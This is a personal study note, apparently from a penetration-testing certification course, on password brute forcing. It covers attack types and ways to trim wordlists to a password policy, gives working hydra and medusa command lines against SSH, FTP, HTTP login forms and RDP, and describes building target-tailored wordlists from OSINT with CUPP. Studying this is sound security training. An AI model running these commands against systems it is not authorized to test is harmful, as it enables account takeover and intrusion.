#CWES #bruteforce #hydra

**When to use brute forcing:**
- When other methods of getting access are exhausted
- Password policies on the target is weak 
- Specific accounts are targeted 

**Different types of brute forcing:**
- **Simple brute force**: try all combinations
- **Dict attack:** Use a dict like rockyou.txt
- **Hybrid attack:**  mix of simple bruteforce with dict attack, ex. adding numbers to a words in a dict
- **Credential stuffing:** passwords from cred leakages 
- **Password spraying:** small set of passwords, large set of usernames
- **Rainbow table:** Compare leaked hashes, with pre-computed hash-to-plaintext list. 
- **Reverse brute force:** single leaked password, against lots of users
- **Distributed brute force:** Cluster of nodes to distribute the computation.

Fun fact:
- Normal computer: can do 1 mill passwords per sec 
- Super computer: can do 1 trill passwords per sec 

**Useful wordslists:**
![[Pasted image 20260515053928.png]]

#### Hybrid attacks
- Combining multiple bruteforce methods 

![[Pasted image 20260519045458.png]]

- The target might have password policies which enforces passwords on a given format, we can use this to our advantage 
eks:
- Minimum length: 8 characters
- Must include:
    - At least one uppercase letter
    - At least one lowercase letter
    - At least one number

If we know this, we can filter our wordlist to match these requirements:

```shell
grep -E '^.{8,}$' darkweb2017_top-10000.txt > darkweb2017-minlength.txt
```
- Min 8 characters

```shell
grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
```
- Min 1 uppercase letter 

and so on... This will reduce the search space drastically. 

#### Hydra:
![[Pasted image 20260519050130.png]]


**Examples of using hydra:**

Multiple ssh targets:
```shell
hydra -l root -p toor -M targets.txt ssh
```

FTP on non standard port:
```shell
hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
```

Login via http post request:
```shell
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```
- Success check: S:302 


```shell
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 154.57.164.67 -s 30351  http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```
- Using wordlist for both username and password
- custom port 
- Fail check: F:Invalid credentials

Login via http get request
```shell
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 154.57.164.83 http-get / -s 31198
```

RDP via advanced bruteforce:
```shell
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```
- 6 - 8 characters, from upper, lower and numbers 
- specifying port, ip and protocol 

#### Medusa

Command format:
```shell
medusa [target_options] [credential_options] -M module [module_options]
```

- Can be used over FTP, HTTP, IMAP, MySQL, POP3, RDP, etc. 

Medusa can also do attacks in parallell: 
```shell
medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
```
- Here web_servers.txt contains a set of server addresses to attack, and for each it will attack with usernames.txt and passwords.txt 

Can also be used to attack with empty or default passwords:
```shell
medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
```
- Change service name with http,ssh,...

Note: We can also do medusa scans locally, ie against localhost. Can be useful if we get access to 1 service and from there want to attack another service which is only available locally. 

#### Tailored attacks
Instead of attacking with the default wordlists such as rockyou.txt etc, a better way can be to tailor the wordlist to the target.

If we do not know the username we can use username anarchy:
https://github.com/urbanadventurer/username-anarchy.git
- It generates username combinations if we know the first and last name of the target 

Then we can use CUPP to generate passwords based on OSINT information:
```shell
sudo apt instal cupp 
```

Then we can filter this generated wordlist to match the company policy for passwords. Which can be somthing like:
- Minimum Length: 6 characters
- Must Include:
    - At least one uppercase letter
    - At least one lowercase letter
    - At least one number
    - At least two special characters (from the set `!@#$%^&*`)

This wordlist will be relevant to the target and hopefully not too long. 